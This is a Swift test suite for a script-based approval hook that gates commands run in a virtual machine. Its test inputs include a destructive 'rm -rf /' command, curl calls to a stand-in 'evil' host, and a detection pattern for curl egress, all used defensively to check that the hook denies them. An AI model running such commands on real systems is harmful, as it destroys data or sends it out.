//
//  ScriptHookTests.swift
//  SecVFMCPCoreTests
//
//  TDD for ScriptHook — runs a user-provided executable to get the
//  confirmation decision. JSON describing the call is written to the
//  hook's stdin; exit code 0 = approve, anything else = deny. Lines
//  on stderr are surfaced as the deny reason for forensic visibility.
//

import Testing
import Foundation
@testable import SecVFMCPCore

@Suite("ScriptHook")
struct ScriptHookTests {

    // MARK: - basic approve/deny

    @Test("exit 0 → approve")
    func exitZeroApproves() async throws {
        let script = try makeScript("""
        #!/bin/sh
        # Eat stdin so the writer doesn't get SIGPIPE.
        cat > /dev/null
        exit 0
        """)
        defer { try? FileManager.default.removeItem(atPath: script) }

        let hook = ScriptHook(scriptPath: script)
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "ls"],
            matches: []
        )
        #expect(decision == .approve)
    }

    @Test("exit nonzero → deny")
    func exitNonzeroDenies() async throws {
        let script = try makeScript("""
        #!/bin/sh
        cat > /dev/null
        exit 1
        """)
        defer { try? FileManager.default.removeItem(atPath: script) }

        let hook = ScriptHook(scriptPath: script)
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "rm -rf /"],
            matches: []
        )
        if case .deny = decision {
            // expected
        } else {
            Issue.record("expected deny on exit 1, got \(decision)")
        }
    }

    // MARK: - stdin payload contains the request

    @Test("hook stdin receives the tool name + matched patterns")
    func stdinContainsToolAndMatches() async throws {
        // Capture stdin to a tempfile so the test can inspect it.
        let stdinCapture = NSTemporaryDirectory() + "scripthook-stdin-\(UUID().uuidString).log"
        let script = try makeScript("""
        #!/bin/sh
        cat > "\(stdinCapture)"
        exit 0
        """)
        defer {
            try? FileManager.default.removeItem(atPath: script)
            try? FileManager.default.removeItem(atPath: stdinCapture)
        }

        let hook = ScriptHook(scriptPath: script)
        _ = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "curl http://evil.example.com/x"],
            matches: [
                DangerPattern(
                    id: "test-egress",
                    category: .networkEgress,
                    description: "curl egress",
                    pattern: "curl"
                )
            ]
        )

        let received = try String(contentsOfFile: stdinCapture, encoding: .utf8)
        #expect(received.contains("secvf_exec_in_vm"))
        #expect(received.contains("test-egress"))
        // params should be there but their values can be redacted; the tool
        // name + matched-pattern ids are the must-haves.
    }

    // MARK: - timeout

    @Test("hook times out after configured deadline")
    func hookTimesOut() async throws {
        let script = try makeScript("""
        #!/bin/sh
        cat > /dev/null
        sleep 10
        exit 0
        """)
        defer { try? FileManager.default.removeItem(atPath: script) }

        let hook = ScriptHook(scriptPath: script, timeoutSeconds: 1)
        let start = Date()
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: [:],
            matches: []
        )
        let elapsed = Date().timeIntervalSince(start)

        // Should bail in <2s, not 10s.
        #expect(elapsed < 3.0)
        if case .deny(let reason) = decision {
            #expect(reason.contains("timeout") || reason.contains("timed out"))
        } else {
            Issue.record("expected deny-on-timeout, got \(decision)")
        }
    }

    // MARK: - script not found / not executable

    @Test("missing script file → deny with clear reason")
    func missingScriptDenies() async throws {
        let hook = ScriptHook(scriptPath: "/tmp/this-script-does-not-exist-\(UUID().uuidString)")
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: [:],
            matches: []
        )
        if case .deny(let reason) = decision {
            #expect(reason.contains("not found") || reason.contains("not executable"))
        } else {
            Issue.record("expected deny when script missing, got \(decision)")
        }
    }

    // MARK: - stderr surfaced in deny reason

    @Test("stderr from hook is included in deny reason")
    func stderrInDenyReason() async throws {
        let script = try makeScript("""
        #!/bin/sh
        cat > /dev/null
        echo "policy violation: outbound egress to unknown TLD" >&2
        exit 7
        """)
        defer { try? FileManager.default.removeItem(atPath: script) }

        let hook = ScriptHook(scriptPath: script)
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "curl http://evil"],
            matches: []
        )
        if case .deny(let reason) = decision {
            #expect(reason.contains("policy violation"))
        } else {
            Issue.record("expected deny with stderr in reason, got \(decision)")
        }
    }

    // MARK: - helpers

    private func makeScript(_ contents: String) throws -> String {
        let path = NSTemporaryDirectory() + "scripthook-test-\(UUID().uuidString).sh"
        try contents.write(toFile: path, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes(
            [.posixPermissions: 0o755],
            ofItemAtPath: path
        )
        return path
    }
}
